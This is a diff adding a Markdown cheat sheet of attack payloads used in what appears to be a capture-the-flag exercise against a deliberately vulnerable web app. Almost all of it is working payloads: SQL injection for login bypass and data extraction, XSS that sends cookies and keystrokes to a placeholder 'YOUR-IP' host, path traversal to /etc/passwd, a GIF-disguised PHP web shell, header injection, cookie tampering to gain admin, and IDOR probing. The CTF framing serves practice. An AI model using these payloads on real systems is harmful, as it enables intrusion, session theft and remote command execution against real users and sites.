@@ -1,0 +1,158 @@
+# Payloads Used in This CTF
+
+## SQL Injection Payloads
+
+### Basic Authentication Bypass
+```sql
+' OR 1=1 --
+' OR '1'='1
+admin' --
+' UNION SELECT NULL--
+```
+
+### Union-Based Injection
+```sql
+' UNION SELECT 1,2,3 --
+' UNION SELECT sql,2,3 FROM sqlite_master --
+' UNION SELECT name,2,3 FROM sqlite_master WHERE type='table' --
+' UNION SELECT flag,id,name FROM flags --
+' UNION SELECT flag,1,2 FROM flags WHERE id=1 --
+```
+
+### Column Counting
+```sql
+' ORDER BY 1 --
+' ORDER BY 2 --
+' ORDER BY 3 --
+' ORDER BY 4 --
+```
+
+### Time-Based Blind
+```sql
+' OR (SELECT sleep(5) FROM users WHERE username='admin') --
+' AND (SELECT sleep(5) FROM flags WHERE id=1) --
+```
+
+## XSS Payloads
+
+### Basic Alert
+```html
+<script>alert('XSS')</script>
+```
+
+### Cookie Stealer
+```html
+<script>
+fetch('http://YOUR-IP:8000/steal?cookie='+document.cookie)
+</script>
+```
+
+### Keylogger
+```html
+<script>
+document.onkeypress = function(e) {
+    fetch('http://YOUR-IP:8000/key?key='+e.key)
+}
+</script>
+```
+
+### Page Defacement
+```html
+<script>document.body.innerHTML = '<h1>PWNED!</h1>'</script>
+```
+
+## Path Traversal Payloads
+
+### Linux Systems
+```
+../../../etc/passwd
+../../../../home/ctf/flag.txt
+../../../app/app.py
+../../../app/myVulnApp.db
+../../../../flag.txt
+```
+
+### Windows Systems
+```
+..\..\..\windows\win.ini
+..\..\..\windows\system32\drivers\etc\hosts
+```
+
+### URL-encoded versions
+```
+%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
+..%252f..%252f..%252fetc%252fpasswd
+```
+
+## File Upload Bypass
+
+### HTML Payload (test.html)
+```html
+<html>
+<body>
+<script>alert('XSS')</script>
+<h1>Upload Successful</h1>
+</body>
+</html>
+```
+
+### Double Extension
+```
+shell.php.jpg
+shell.php;.jpg
+shell.php%00.jpg
+```
+
+### Magic Bytes Bypass
+```bash
+# Add GIF header to PHP file
+echo "GIF89a<?php system($_GET['cmd']); ?>" > shell.php.gif
+```
+
+## HTTP Header Injection
+
+### CRLF Injection
+```
+test\r\nInjected-Header: injected
+test%0d%0aInjected-Header:%20injected
+```
+
+### Host Header Injection
+```
+Host: evil.com
+X-Forwarded-Host: evil.com
+```
+
+## Cookie Tampering
+
+### Original Cookie
+```
+session=eyJfZmxhc2hlcyI6W3siIHQiOlsibWVzc2FnZSIsIkxvZ2dlZCBpbiBzdWNjZXNzZnVsbHkiXX1dLCJyb2xlIjoidXNlciIsInVzZXJfaWQiOjR9.aZkTfg.D5hb57VZ5uA-m9-A4IKRs-ymzwM
+```
+
+### Modified Payload (Admin)
+```json
+{"_flashes":[],"role":"ADMIN","user_id":3}
+```
+
+## IDOR Testing
+
+### Profile IDs
+```
+/profile/1
+/profile/2
+/profile/3
+/profile/4
+/profile/admin
+/profile/0
+/profile/999
+```
+
+### Note IDs
+```
+/notes/1
+/notes/2
+/notes/3
+/notes/delete/1
+/notes/delete/2
+```
